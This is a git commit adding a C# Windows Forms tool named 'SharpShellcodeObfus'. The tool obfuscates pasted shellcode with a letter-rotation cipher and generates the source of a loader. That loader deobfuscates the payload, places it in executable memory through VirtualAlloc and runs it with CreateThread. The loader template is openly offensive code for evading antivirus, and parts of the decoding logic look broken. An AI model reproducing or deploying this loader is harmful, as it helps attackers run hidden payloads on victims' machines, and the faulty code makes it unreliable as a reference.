e13b4e44924dbfb02a3a36363401ae09d1b206c5
lengjibo <qqlengyi@163.com>
2021-07-08 16:15:51 +0800

    upload

---
+++ SharpShellcodeObfus/SharpShellcodeObfus/Form1.Designer.cs
@@ -0,0 +1,141 @@
+﻿namespace SharpShellcodeObfus
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.Location = new System.Drawing.Point(22, 25);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(79, 30);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Shellcode：";
+            this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(118, 25);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(631, 248);
+            this.textBox1.TabIndex = 1;
+            // 
+            // label2
+            // 
+            this.label2.Location = new System.Drawing.Point(22, 324);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(79, 30);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "rotations：";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("宋体", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.button1.Location = new System.Drawing.Point(52, 435);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(298, 89);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "Generate";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.BackgroundImage")));
+            this.pictureBox1.Location = new System.Drawing.Point(462, 324);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(261, 186);
+            this.pictureBox1.TabIndex = 5;
+            this.pictureBox1.TabStop = false;
+            // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.Location = new System.Drawing.Point(118, 333);
+            this.numericUpDown1.Maximum = new decimal(new int[] {
+            5,
+            0,
+            0,
+            0});
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(133, 21);
+            this.numericUpDown1.TabIndex = 6;
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(52, 571);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(615, 108);
+            this.textBox2.TabIndex = 7;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(824, 708);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.numericUpDown1);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "SharpShellcodeObfus  author：lengyi@honghuseclab";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private System.Windows.Forms.TextBox textBox2;
+    }
+}
+
---
+++ SharpShellcodeObfus/SharpShellcodeObfus/Form1.cs
@@ -0,0 +1,131 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+
+namespace SharpShellcodeObfus
+{
+    public partial class Form1 : Form
+    {
+        int index;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            char[] alpha = "abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz".ToCharArray();
+            string al = new string(alpha);
+            Cipher(al);
+        }
+
+        private void Cipher(string al)
+        {
+            String ObfusShellcode = "";
+
+            char[] charArray = textBox1.Text.ToCharArray();
+            string ch = new string(charArray);
+
+            index = int.Parse(numericUpDown1.Text);
+
+            for (int i = 0; i < ch.Length; i++)
+            {
+
+                if (al.Contains(charArray[i].ToString()))
+                {
+                    for (int j = 0; j < al.Length; j++)
+                    {
+                        if (ch[i] == al[j])
+                        {
+                            ObfusShellcode += ((al[j + index]).ToString());
+                            break;
+                        }
+                    }
+                }
+                else
+                {
+                    
+                    ObfusShellcode += (charArray[i].ToString());
+                }
+                string loaders = @"using System;
+                            using System.Collections.Generic;
+                            using System.Linq;
+                            using System.Runtime.InteropServices;
+                            using System.Text;
+
+                            namespace part1
+                                {
+                                    class Program
+                                    {
+                                        static void Main(string[] args)
+                                        {
+                                           char[] revalpha = ""zyxwvutsrqponmlkjihgfedcba0987654321zyxwvutsrqponmlkjihgfedcba"".ToCharArray();
+                                           string reval = new string(revalpha);
+                                           string defobfshellcode = """";
+                                            string shellcodes = ""REPLACE SHELLCODE HERE"";
+                                            defobfshellcode =  Cipher(reval,shellcodes);
+                                            byte[] decBytes = System.Text.Encoding.UTF8.GetBytes(defobfshellcode);
+                                            UInt32 MEM_COMMIT = 0x1000;
+                                            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+                                            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)decBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                                            Marshal.Copy(decBytes, 0x0000, (IntPtr)(funcAddr), decBytes.Length);
+                                            IntPtr hThread = IntPtr.Zero;
+                                            UInt32 threadId = 0x0000;
+                                            IntPtr pinfo = IntPtr.Zero;
+                                            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
+                                            WaitForSingleObject(hThread, 0xffffffff);
+                                        }
+                                        
+                                            public static string Cipher(string al,string obfshellcode){
+
+                                                string deobfshellcode = """";
+                                                int index = 2222;
+                                                char[] charArray = obfshellcode.ToCharArray();
+                                                string ch = new string(charArray);
+
+
+                                                for (int i = 0; i < ch.Length; i++)
+                                                {
+
+                                                    if (al.Contains(charArray[i].ToString()))
+                                                    {
+                                                        for (int j = 0; j < al.Length; j++)
+                                                        {
+                                                            if (ch[i] == al[j])
+                                                            {
+                                                                deobfshellcode += ((al[j + index]).ToString());
+                                                                break;
+                                                            }
+                                                        }
+                                                    }
+                                                    else
+                                                    {
+                                                        deobfshellcode += (charArray[i].ToString());
+                                                    }
+                                                }
+
+                                                return deobfshellcode;
+                                            }
+
+
+        
+                                        [DllImport(""kernel32"")]
+                                        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+                                        [DllImport(""kernel32"")]
+                                        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+                                        [DllImport(""kernel32"")]
+                                        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+                                    }
+                                }";
+                loaders = loaders.Replace("\"REPLACE SHELLCODE HERE\"", "\"" + ObfusShellcode + "\"").Replace("2222",index.ToString());
+                textBox2.Text = loaders;
+            }
+        }
+    }
+}
